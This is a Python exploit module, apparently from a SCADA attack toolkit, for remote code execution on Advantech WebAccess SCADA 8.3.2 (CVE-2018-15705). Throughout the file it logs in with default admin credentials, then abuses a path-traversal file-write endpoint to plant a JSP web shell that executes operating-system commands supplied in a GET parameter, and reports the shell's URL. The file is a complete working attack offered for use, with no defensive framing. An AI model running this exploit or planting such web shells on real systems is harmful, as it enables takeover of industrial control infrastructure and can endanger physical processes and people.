# advantech_webaccess_rce.py

import requests
from urllib.parse import urlencode
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 80, user: str = "admin", pwd: str =  "admin", project: str = "Demo", jsp_name: str = "evil.jsp", cmd_param: str = "cmd"):
    """
    Exploit for Advantech WebAccess SCADA 8.3.2 - Remote Code Execution
    CVEs: CVE-2018-15705 / CVE-2018-15707
    Author: Chris Lyne (@lynerc) - Pythonized by SCADApocalypse Team

    Exploits:
        - Authentication bypass and file upload to write malicious .jsp file
        - Optional: User interaction for stealing credentials (CVE-2018-15707) not included here

    Args:
        target (str): IP or domain of the target
        port (int): Port where WebAccess is running (usually 80)
        project (str): Existing project name
        jsp_name (str): JSP file name to write
        cmd_param (str): Name of the GET parameter to pass OS command

    Returns:
        bool: True if exploitation succeeded, False otherwise
    """

    endpoint = f"http://{target}:{port}/WADashboard"
    shell_path = f"http://{target}:{port}/{jsp_name}"

    logger.info(f"[+] Target: {target}:{port}")
    logger.info(f"[+] Project: {project}")
    logger.info(f"[+] JSP File: {jsp_name}")
    logger.info("[*] Attempting login to WADashboard...")

    try:
        sess = requests.Session()

        # Step 1: Attempt login (default creds or stolen via CVE-2018-15707)
        login = sess.post(
            f"{endpoint}/login?cont=dashboardViewer",
            data={
                "projectName1": project,
                "username": user,     
                "password": pwd,
                "recId": ""
            },
            timeout=5
        )

        if "dashboard" not in login.text.lower():
            logger.error("[!] Login failed. Check credentials or project name.")
            return False
        logger.success("[+] Login succeeded")

        # Step 2: Write malicious JSP using file upload path traversal (CVE-2018-15705)
        logger.info("[*] Uploading malicious JSP to WebAccess directory...")

        payload = f"""<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("{cmd_param}");
    if (cmd != null) {{
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {{
            out.println(disr);
            disr = dis.readLine();
        }}
    }}
%>
"""

        upload = sess.post(
            f"{endpoint}/api/dashboard/v1/files/writeFile",
            params={
                "projectSpecies": f"{project}!savedConfiguration",
                "folderpath": f"../../../{jsp_name}",
                "msg": payload,
                "overwrite": "true"
            },
            timeout=5
        )

        if upload.status_code == 200:
            logger.success(f"[+] JSP uploaded successfully: {shell_path}?{cmd_param}=whoami")
            return True
        else:
            logger.error("[!] Upload failed. Server returned non-200.")
            return False

    except Exception as e:
        logger.error(f"[!] Exploit failed due to exception: {e}")
        return False
